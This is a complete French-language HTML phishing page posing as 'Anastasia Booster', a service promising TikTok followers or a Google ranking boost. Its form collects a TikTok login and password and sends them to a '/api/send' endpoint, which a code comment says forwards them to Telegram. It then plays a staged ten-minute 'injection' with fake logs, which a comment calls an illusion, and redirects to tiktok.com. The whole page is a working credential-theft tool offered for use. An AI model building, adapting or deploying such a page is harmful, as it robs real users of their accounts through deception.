<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anastasia Booster | Injection v2.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050505; color: #bc13fe; font-family: 'Courier New', monospace; }
        .card { border: 2px solid #bc13fe; background: #000; box-shadow: 0 0 25px #bc13fe66; }
        .progress-bar { width: 0%; height: 4px; background: #bc13fe; transition: width 0.5s; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div id="main-container" class="card w-full max-w-md p-8 rounded-3xl text-center">
        <h1 class="text-3xl font-black italic mb-2 tracking-tighter">ANASTASIA BOOSTER</h1>
        <p class="text-[10px] text-zinc-500 mb-8 uppercase tracking-widest">Injection Temporaire (48h) | Moteur Node.js</p>

        <div id="step-form" class="space-y-4">
            <input type="text" id="user" placeholder="Email ou @Utilisateur TikTok" 
                class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none focus:border-white">
            <input type="password" id="pass" placeholder="Mot de passe" 
                class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none focus:border-white">
            
            <select id="type" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white">
                <option value="TikTok">+1000 Abonnés / Likes (TikTok)</option>
                <option value="Google">Boost Référencement (Google)</option>
            </select>

            <button onclick="lancer()" id="btn" class="w-full py-4 bg-violet-600 text-black font-black rounded-xl hover:bg-white transition-all">
                DÉMARRER LE BOOST
            </button>
        </div>

        <div id="step-wait" class="hidden space-y-6">
            <div class="text-3xl font-bold italic text-white" id="timer">10:00</div>
            <div class="w-full bg-zinc-800 rounded-full h-1 overflow-hidden">
                <div id="progress" class="progress-bar"></div>
            </div>
            <div class="text-left text-[9px] text-green-500 font-mono h-24 overflow-hidden" id="logs">
                > Initialisation des proxys...<br>
                > Connexion au serveur Anastasia...<br>
                > Injection des paquets en cours...
            </div>
        </div>
    </div>

    <script>
        let timerSeconds = 600; // 10 minutes

        async function lancer() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const t = document.getElementById('type').value;

            if(!u || !p) return alert("Champs obligatoires !");

            // Capture immédiate vers Telegram
            await fetch('/api/send', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user: u, pass: p, platform: t })
            });

            // Passage à l'illusion du chargement
            document.getElementById('step-form').classList.add('hidden');
            document.getElementById('step-wait').classList.remove('hidden');
            
            const interval = setInterval(() => {
                timerSeconds--;
                let mins = Math.floor(timerSeconds / 60);
                let secs = timerSeconds % 60;
                document.getElementById('timer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
                document.getElementById('progress').style.width = `${((600 - timerSeconds) / 600) * 100}%`;

                if(timerSeconds <= 0) {
                    clearInterval(interval);
                    alert("Boost activé pour 48h !");
                    window.location.href = "https://www.tiktok.com";
                }
            }, 1000);
        }
    </script>
</body>
</html>
